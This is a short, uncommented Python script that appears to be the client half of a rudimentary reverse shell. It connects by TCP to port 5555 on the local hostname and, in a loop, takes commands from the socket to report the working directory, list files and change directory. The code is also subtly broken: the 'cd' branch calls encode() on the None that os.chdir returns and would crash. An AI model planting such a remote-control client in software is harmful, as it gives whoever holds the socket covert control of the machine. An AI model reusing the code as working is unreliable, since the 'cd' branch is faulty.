
import socket, os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#host='127.0.0.1'
host=socket.gethostname()
port=5555

s.connect((host,port))

while 1:
	command=s.recv(1024)
	command=command.decode()
	if command=='pcwd':
		pcwd=os.getcwd()
		pcwd=str(pcwd)
		s.send(pcwd.encode())

	elif command=='ls':
		ls=os.listdir()
		ls=str(ls)
		s.send(ls.encode())
	elif command=='cd':
		cd=s.recv(1024)
		cd=cd.decode()
		cdr=os.chdir(cd)
		s.send(cdr.encode())